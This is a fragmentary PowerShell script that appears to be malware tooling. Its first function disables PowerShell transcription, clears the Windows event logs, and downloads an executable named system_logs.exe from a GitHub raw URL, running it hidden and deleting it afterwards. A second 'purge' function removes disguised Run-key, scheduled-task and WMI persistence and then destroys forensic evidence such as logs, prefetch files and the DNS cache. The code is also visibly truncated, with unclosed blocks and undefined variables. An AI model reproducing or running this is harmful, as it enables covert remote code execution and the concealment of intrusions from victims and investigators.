function Deploy-SilentSystem {

[DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
"@

        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableTranscripting" -Value 0 -ErrorAction SilentlyContinue
        
        # IMMEDIATE LOG CLEARING
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
        wevtutil cl "System" 2>$null
        wevtutil cl "Application" 2>$null

    try {
        # MULTI-SOURCE DOWNLOAD STRATEGY
        $downloadUrls = @(
            "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe",
            "https://github.com/Verte225066/test/raw/main/system_logs.exe"
        )
        
        $success = $false
        foreach ($url in $downloadUrls) {
            try {
                Write-Host "[DOWNLOAD] Attempting: $url" -ForegroundColor Gray

                $webClient.Dispose()

            }

            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $tempExePath
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow = $true
            $processInfo.UseShellExecute = $false
            $processInfo.RedirectStandardOutput = $true
            $processInfo.RedirectStandardError = $true
            
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processInfo
            $process.Start() | Out-Null
            
            # DELAYED FILE CLEANUP
            Start-Job -ScriptBlock {
                param($path)
                Start-Sleep -Seconds 10
                if (Test-Path $path) {
                    Remove-Item $path -Force -ErrorAction SilentlyContinue

function Complete-SystemPurge {
    Write-Host "`n[!] INITIATING COMPLETE SYSTEM PURGE" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    
    $removalReport = @()
    $totalRemoved = 0

    # PHASE 1: PERSISTENCE REMOVAL
    Write-Host "`n[PHASE 1] Removing persistence mechanisms..." -ForegroundColor Yellow
    
    # Registry Persistence Removal
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    )
    
    foreach ($regPath in $regPaths) {
        try {
            $entries = Get-ItemProperty $regPath -ErrorAction SilentlyContinue | 
                Get-Member -MemberType NoteProperty | 
                Where-Object {$_.Name -like "*SystemMaintenance*" -or $_.Name -like "*WindowsUpdateManager*"}
            
            if ($entries) {
                foreach ($entry in $entries) {
                    Remove-ItemProperty -Path $regPath -Name $entry.Name -Force -ErrorAction SilentlyContinue
                    $removalReport += "✓ Registry entry removed: $($entry.Name)"
                    $totalRemoved++
                }
            }
        } catch {}
    }

    # Scheduled Tasks Removal
    try {
        $tasks = Get-ScheduledTask -TaskName "WindowsUpdateService*" -ErrorAction SilentlyContinue
        if ($tasks) {
            $tasks | Unregister-ScheduledTask -Confirm:$false
            $removalReport += "✓ Scheduled tasks removed: $($tasks.Count) tasks"
            $totalRemoved += $tasks.Count
        }
    } catch {}

    # WMI Subscription Removal
    try {
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'Win32_ProcessStart_%'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name LIKE 'SystemMonitor_%'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
        $removalReport += "✓ WMI event subscriptions removed"
        $totalRemoved++
    } catch {}

    # PHASE 2: PROCESS TERMINATION
    Write-Host "[PHASE 2] Terminating active processes..." -ForegroundColor Yellow
    
    try {
        $jobs = Get-Job
        if ($jobs) {
            $jobs | Remove-Job -Force
            $removalReport += "✓ Background jobs terminated: $($jobs.Count) jobs"
            $totalRemoved += $jobs.Count
        }
    } catch {}

    # PHASE 3: FILE SYSTEM CLEANUP
    Write-Host "[PHASE 3] Removing program files..." -ForegroundColor Yellow
    
    $filePatterns = @(
        "$env:TEMP\sys_*.tmp",
        "$env:TEMP\sys_*.exe", 
        "$env:TEMP\system_logs.exe",
        "$env:TEMP\test.exe"
    )
    
    $filesRemoved = 0
    foreach ($pattern in $filePatterns) {
        try {
            $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
            if ($files) {
                $files | Remove-Item -Force -ErrorAction SilentlyContinue
                $filesRemoved += $files.Count
            }
        } catch {}
    }
    
    if ($filesRemoved -gt 0) {
        $removalReport += "✓ Program files deleted: $filesRemoved files"
        $totalRemoved += $filesRemoved
    }

    # PHASE 4: EVIDENCE DESTRUCTION
    Write-Host "[PHASE 4] Destroying forensic evidence..." -ForegroundColor Yellow
    
    try {
        # Event Logs
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
        wevtutil cl "System" 2>$null
        wevtutil cl "Application" 2>$null
        $removalReport += "✓ Event logs cleared"
        $totalRemoved++

        # Prefetch Files
        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
        $removalReport += "✓ Prefetch cache cleared"
        $totalRemoved++

        # Temporary Data
        Get-ChildItem "$env:TEMP\*" -Include "*.tmp", "*.log", "*.temp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        $removalReport += "✓ Temporary files cleaned"
        $totalRemoved++

        # DNS Cache
        ipconfig /flushdns 2>$null
        $removalReport += "✓ DNS cache flushed"
        $totalRemoved++

    } catch {}

    # FINAL REPORT
    Write-Host "`n" + "="*60 -ForegroundColor Green
    Write-Host "🏁 SYSTEM PURGE COMPLETE - FINAL REPORT" -ForegroundColor Green
    Write-Host "="*60 -ForegroundColor Green
    
    foreach ($item in $removalReport) {
        Write-Host "  $item" -ForegroundColor Green
    }
    
    Write-Host "`n" + "-"*60 -ForegroundColor Cyan
    Write-Host "📊 SUMMARY" -ForegroundColor Cyan
    Write-Host "-"*60 -ForegroundColor Cyan
    
    if ($totalRemoved -gt 0) {
        Write-Host "  ✅ PROGRAM SUCCESSFULLY REMOVED" -ForegroundColor Green
        Write-Host "  • Total components eliminated: $totalRemoved" -ForegroundColor White
        Write-Host "  • Persistence mechanisms: Destroyed" -ForegroundColor White
        Write-Host "  • Program files: Removed" -ForegroundColor White
        Write-Host "  • Forensic evidence: Eliminated" -ForegroundColor White
        Write-Host "  • System returned to clean state" -ForegroundColor White
    } else {
        Write-Host "  ℹ️  NO PROGRAM COMPONENTS FOUND" -ForegroundColor Yellow
        Write-Host "  • System already clean or program not installed" -ForegroundColor White
    }
    
    Write-Host "-"*60 -ForegroundColor Cyan
    Write-Host "`n[PURGE COMPLETE] System sanitization finished" -ForegroundColor Green
    
    Start-Sleep -Seconds 3
}
